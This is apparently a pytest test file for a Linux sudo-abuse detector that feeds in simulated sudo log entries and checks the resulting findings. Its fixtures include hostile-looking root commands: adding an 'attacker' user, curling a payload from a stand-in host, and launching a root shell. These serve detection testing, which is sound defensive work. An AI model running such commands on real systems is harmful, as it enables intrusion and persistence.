from src.detection.linux.sudo_abuse_detector import (
    detect_sudo_abuse,
)
from src.models.linux_event import LinuxEvent


def create_sudo_event(
    message: str,
    user: str = "alex",
    hostname: str = "ubuntu-server",
) -> LinuxEvent:
    return LinuxEvent(
        timestamp="Jul  7 09:15:01",
        hostname=hostname,
        service="sudo",
        process="sudo",
        user=user,
        message=message,
        action="command",
        status="success",
    )


def test_detect_sudo_useradd_activity():
    events = [
        create_sudo_event(
            "alex : TTY=pts/0 ; PWD=/home/alex ; "
            "USER=root ; COMMAND=/usr/sbin/useradd attacker"
        )
    ]

    findings = detect_sudo_abuse(events)

    assert len(findings) == 1
    assert findings[0].title == "Sudo Abuse Detected"
    assert findings[0].severity == "high"
    assert findings[0].hostname == "ubuntu-server"


def test_detect_sudo_download_command():
    events = [
        create_sudo_event(
            "alex : TTY=pts/0 ; PWD=/tmp ; "
            "USER=root ; COMMAND=/usr/bin/curl "
            "http://example.test/payload"
        )
    ]

    findings = detect_sudo_abuse(events)

    assert len(findings) == 1
    assert findings[0].title == "Sudo Abuse Detected"


def test_detect_sudo_shell_execution():
    events = [
        create_sudo_event(
            "alex : TTY=pts/0 ; PWD=/home/alex ; "
            "USER=root ; COMMAND=/bin/bash"
        )
    ]

    findings = detect_sudo_abuse(events)

    assert len(findings) == 1


def test_ignore_normal_sudo_command():
    events = [
        create_sudo_event(
            "alex : TTY=pts/0 ; PWD=/home/alex ; "
            "USER=root ; COMMAND=/usr/bin/apt update"
        )
    ]

    findings = detect_sudo_abuse(events)

    assert findings == []


def test_ignore_non_sudo_event():
    events = [
        LinuxEvent(
            service="ssh",
            message="useradd attacker",
            action="authentication",
            status="failed",
        )
    ]

    findings = detect_sudo_abuse(events)

    assert findings == []


def test_deduplicate_identical_sudo_events():
    message = (
        "alex : TTY=pts/0 ; PWD=/home/alex ; "
        "USER=root ; COMMAND=/usr/sbin/useradd attacker"
    )

    events = [
        create_sudo_event(message),
        create_sudo_event(message),
    ]

    findings = detect_sudo_abuse(events)

    assert len(findings) == 1